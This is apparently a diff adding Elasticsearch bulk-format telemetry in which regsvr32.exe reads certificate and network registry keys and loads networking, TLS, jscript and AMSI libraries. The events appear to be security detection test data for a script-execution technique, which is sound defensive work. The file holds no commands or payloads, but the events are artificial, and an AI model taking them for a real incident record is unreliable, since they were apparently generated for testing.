+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\SmartCardRoot", "registry_value": "SmartCardRoot", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\CA", "registry_value": "CA", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\CA", "registry_value": "CA", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA", "registry_value": "CA", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA", "registry_value": "CA", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root", "registry_value": "Root", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates", "registry_path": "HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA", "registry_value": "CA", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Content", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Content\\CachePrefix", "registry_value": "CachePrefix", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Cookies", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\Cookies\\CachePrefix", "registry_value": "CachePrefix", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\History", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\Cache\\History\\CachePrefix", "registry_value": "CachePrefix", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "dnsapi.dll", "image_path": "C:\\Windows\\System32\\dnsapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "rasadhlp.dll", "image_path": "C:\\Windows\\System32\\rasadhlp.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip", "registry_path": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters", "registry_value": "Parameters", "timestamp": 131883573238230000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "wininet.dll", "image_path": "C:\\Windows\\System32\\wininet.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573237930000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "FWPUCLNT.DLL", "image_path": "C:\\Windows\\System32\\FWPUCLNT.DLL", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238400000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "schannel.dll", "image_path": "C:\\Windows\\System32\\schannel.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238700016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders", "registry_path": "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL", "registry_value": "SCHANNEL", "timestamp": 131883573238700016, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "mskeyprotect.dll", "image_path": "C:\\Windows\\System32\\mskeyprotect.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ncrypt.dll", "image_path": "C:\\Windows\\System32\\ncrypt.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ntasn1.dll", "image_path": "C:\\Windows\\System32\\ntasn1.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers\\Software Publishing", "registry_value": "Software Publishing", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "cryptnet.dll", "image_path": "C:\\Windows\\System32\\cryptnet.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000_Classes\\Local Settings\\MuiCache\\1\\52C64B7E\\LanguageList", "registry_value": "LanguageList", "timestamp": 131883573238869984, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "ncryptsslp.dll", "image_path": "C:\\Windows\\System32\\ncryptsslp.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573239170000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "clbcatq.dll", "image_path": "C:\\Windows\\System32\\clbcatq.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240110000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "wldp.dll", "image_path": "C:\\Windows\\System32\\wldp.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240110000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers\\Software Publishing", "registry_value": "Software Publishing", "timestamp": 131883573240110000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "userenv.dll", "image_path": "C:\\Windows\\System32\\userenv.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240270000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "version.dll", "image_path": "C:\\Windows\\System32\\version.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "shell32.dll", "image_path": "C:\\Windows\\System32\\shell32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "cfgmgr32.dll", "image_path": "C:\\Windows\\System32\\cfgmgr32.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "mpr.dll", "image_path": "C:\\Windows\\System32\\mpr.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "sxs.dll", "image_path": "C:\\Windows\\System32\\sxs.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240580000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "gpapi.dll", "image_path": "C:\\Windows\\System32\\gpapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240580000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "OneCoreUAPCommonProxyStub.dll", "image_path": "C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240740000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace", "registry_value": "NameSpace", "timestamp": 131883573240740000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop", "registry_path": "HKU\\S-1-5-21-2047549730-3016700585-885829632-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace", "registry_value": "NameSpace", "timestamp": 131883573240740000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\DelegateFolders", "registry_value": "DelegateFolders", "timestamp": 131883573240740000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "jscript.dll", "image_path": "C:\\Windows\\System32\\jscript.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240270000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "amsi.dll", "image_path": "C:\\Windows\\System32\\amsi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240270000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "registry", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\WINDOWS\\system32\\regsvr32.exe", "registry_key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SyncRootManager", "registry_value": "SyncRootManager", "timestamp": 131883573240890000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "edputil.dll", "image_path": "C:\\Windows\\System32\\edputil.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240890000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "Windows.StateRepositoryPS.dll", "image_path": "C:\\Windows\\System32\\Windows.StateRepositoryPS.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240890000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "MpOAV.dll", "image_path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1810.5-0\\MpOAV.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573240430000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "cldapi.dll", "image_path": "C:\\Windows\\System32\\cldapi.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573241050000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
+{ "event_type": "image_load", "image_name": "WinTypes.dll", "image_path": "C:\\Windows\\System32\\WinTypes.dll", "pid": 2012, "process_name": "regsvr32.exe", "process_path": "C:\\Windows\\System32\\regsvr32.exe", "timestamp": 131883573241050000, "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}" }
+{"index":{}}
